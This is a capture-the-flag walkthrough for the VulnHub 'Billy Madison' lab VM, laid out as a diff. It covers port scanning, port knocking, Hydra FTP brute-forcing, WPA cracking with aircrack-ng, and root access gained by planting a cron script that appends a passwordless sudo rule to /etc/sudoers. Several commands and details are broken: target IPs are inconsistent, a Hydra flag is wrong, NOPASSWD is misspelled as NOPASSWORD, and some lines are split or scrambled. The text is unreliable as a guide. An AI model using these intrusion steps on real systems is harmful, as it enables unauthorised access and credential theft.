@@ -1,0 +1,133 @@
+
+Hack the Billy Madison VM (CTF Challenge)
+
+Today in our CTF challenges we are going to do Billy Madison. This VM is based on 90’s movie Billy Madison, hence the name of the VM. The main aim of this VM is to figure out how Eric took over the machine and then undo his changes so you can recover Billy’s 12th grade final project. You will probably need to root the VM to complete this objective. Without further ado let’s start.
+Download the lab from: https://www.vulnhub.com/entry/billy-madison-11,161/
+WalkThrough
+Let’s locate our target first.
+netdiscover
+
+Our target is 192.168.1.103. Scan it with nmap.
+nmap –p- -A 192.168.1.103
+
+Okay! So from nmap we have discovered the port : 22, 23, 69, 80, 137, 138, 139, 445, 2525. So, I opened our target in the browser at port 69.
+
+A WordPress website opens. I explored this lot and tried to exploit it but it was useless. So I simply opened our target in the browser at its by-default port i.e. 80. The following page opens.
+
+Then I explored smb port.
+smbclient –L 192.168.0.103
+When it asks for password then just hit enter without entering a password.
+
+It just told us that backdoor are currently closed. So then I traversed telnet.
+telnet 192.168.0.103
+
+There was a message in telnet telling us the password and that it has been encrypted with ROT13(hint: ROTten). Let’s decode it.
+
+By decrypting it, it comes to be as exschmenuating. Now this could be a directory so I opened it in the browser
+
+Now in the browser it opened a webpage which gave us few hints for moving forward. Through conclusion we now know that there is .cap file. And that it is saved with the name which includes ‘veronica’ and that name and be derived from rockyou.txt.
+Now there are many names in rockyou.txt but we only need the ones with have veronica in it and for that use the following command:
+grep –I veronica /usr/share/wordslists/rockyou.txt > /root/Desktop/dict.txt
+
+Execution of the above command will create a text file with names veronica in it. Now use this text file and find the file which had veronica in it through DirBuster. And for this, open DirBuster and give the URL in the Target URL text box and then give the path of the text file you just created using grep command. Give the directory name in Dir to start with text box and then give cap as the file extension.
+
+As a result it will show you 012987veronica.cap file.
+
+Open it in the browser. It will ask you to download it, go ahead with it.
+
+Now check the TCP stream of every packet. In of it you will find an email sent from Eric to Veronica, telling her to download a certain antivirus.
+
+In another TCP stream you will find that Veronica has replied to Eric, saying that to share the link through FTP server along with a youtube link.
+
+Again in a TCP stream of a packet you will find that Eric has told her about his username and password.
+
+Ok! So we have eric’s username and password. Keep that with you for later use. Meanwhile, let’s check out the youtube link.
+
+In the video it says the combination of some numbers. Now these numbers could be used for port knocking. So, let’s try it.
+For x in 1466 67 1468 1514 1981 1986; do nmap –Pn –host_timeout 201 –max-retries 0 –p $x 192.168.0.103; done.
+
+Then to check I fired up the nmap again.
+nmap –p- 192.168.0.103
+
+And Voila!! FTP port opened on 21. Lets’ enter through it now as we have username and password. Remember The password and username for eric we discovered earlier.
+ftp 192.168.0.103
+Now let’s see the directories in it.
+dir
+There is a file named .notes. I decided to read it but before doing so I had to download it, therefore, type :
+get .notes
+exit
+
+Now that notes file is downloaded, type the following command in the terminal of kali to read it:
+cat .notes
+
+There was a message in the notes by eric. Now if you remember the conversation of veronica and eric then you would know that there are two users on ftp server. second one is veronica. Naturally I decided to use hydra to apply the brute force attack on FTP to get the username and password using the same dictionary file which I had created with grep.
+hydra –l veronica –p /root/Desktop/ver.txt ftp://192.168.0.103
+
+And yes!! We have the password along with username i.e. veronica and babygirl_veronica07@yahoo.com respectively. Then I decided to explore more of FTP with veronica’s username and password and I found two files there: one is of .cap and other .eml and downloaded then both and to achieve so type the combination of the following commands:
+ftp 192.168.0.103
+dir
+binary
+get eg-01.cap
+get email-from-billy.eml
+
+Let’s read the email now.
+
+In the mail he says how he hacks Eric’s wireless password. But if you observe everything you will find that he has used swaks to send this mail. Now swaks is a SMTP server that is a featureful, flexible, scriptable, transaction-oriented tool developed by John Jetmore. So, therefore I used the following command next:
+swaks –to eric@madisonhotels.com –from vvaughn@polyfector.edu –server 192.168.0.104:2525 – body “My kid will be a soccer player”  –header “Subject: My kid will be soccer player”
+
+Further I used aircrack-ng to monitor eg-01.cap to because the email that was sent through the swaks mentioned something about wifi password.
+aircrack-ng /root/Desktop/eg-01.cap –w /usr/share/wordlists/rockyou.txt
+
+And with aircrack-ng we found the password of wireless i.e. triscuit*.
+
+Now if you again scan it with nmap.
+nmap –p- -A 192.168.0.103
+
+As a result you can see that a new port opens i.e. 1974 with SSH service. Let’s try and log in with SSH.
+ssh eric@192.168.0.103 –p 1974
+And then give the password triscuit*. Once I was logged in I checked it linux’s version with the following command but it was not exploitable.
+lsb_release –a
+Then typed following command to see what it has to offer :
+ls
+There I found a text file so I decided to read it.
+cat why-1974.txt
+
+Then type the following command:
+find / -perm -2000 –types f 2>/dev/null
+
+I was pretty lost here so decided to take some help from Mr. Goblin (https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/) and so type the following set of commands:
+touch /tmp/test
+/usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test
+echo –e ‘#!/bin/bash\ne
+cho “eric ALL=(ALL) NOPASSWORD:ALL” >> /etc/sudoers’ > /etc/cron.hourly/test
+chmod +x /etc/cron.hourly/test
+cat /etc/chron.hourly/test
+
+This way you will escalate the privileges and reach root. Lets see what files root has:
+ls
+I decided to read /PRIVATE file.
+cd /PRIVATE
+ls 
+Here, I found a hint.txt and BowelMovement files. First I opened hint.txt.
+cat hint.txt
+In this file he is talking about the BowelMovement file and about its password which is the link given. So I copied the BowelMovement file.
+cp BowelMovement /var/www/html
+
+And then I created a dictionary file using cewl and that link.
+cewl –depth 0 https://en.wikipedia.org/wiki/Billy_Madison > /root/Desktop/billt.txt
+
+By brute forcing you will find the correct password from this dictionary file. Using that password open theovement file that you have downloaded. BowelM.
+
+And then open the same in the terminal of kali and type :
+ls
+There is a file called secret.zip, unzip it.
+unzip secret.zip
+
+In the zipped folder there were two files. I decided to read them both.
+cat THE-END.txt
+cat Billy_Madison12th_Grade_Fimal_Project.doc
+
+Finally! We have solved the CTF. Enjoy!
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here.
+
+
